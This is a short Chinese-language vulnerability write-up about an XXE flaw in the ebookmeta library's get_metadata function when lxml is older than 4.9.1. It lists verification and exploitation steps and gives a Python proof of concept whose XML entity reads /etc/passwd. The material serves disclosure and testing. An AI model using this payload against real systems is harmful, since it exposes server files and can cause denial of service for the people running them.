验证漏洞存在方法
    - 检查系统中安装的lxml版本是否低于4.9.1
    - 尝试使用ebookmeta库处理包含XXE payload的XML文件
    - 观察是否能够读取系统文件或导致拒绝服务

漏洞利用方法
    - 此漏洞存在于ebookmeta库的get_metadata函数中，该函数使用lxml解析XML
    - 攻击者可以构造包含恶意XML外部实体引用的电子书元数据文件
    - 当使用受影响版本的ebookmeta处理该文件时，会触发XXE漏洞
    - 攻击者可以利用此漏洞读取服务器上的敏感文件或造成拒绝服务攻击
    
PoC示例：
```python
import ebookmeta

# 构造包含XXE payload的XML文件
xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<metadata>
    <title>&xxe;</title>
</metadata>'''

# 将payload保存到文件
with open('malicious.xml', 'w') as f:
    f.write(xxe_payload)

# 使用受影响版本的ebookmeta处理恶意文件
try:
    metadata = ebookmeta.get_metadata('malicious.xml')
    print("漏洞存在！XXE payload已执行")
except Exception as e:
    print(f"错误信息: {e}")
```
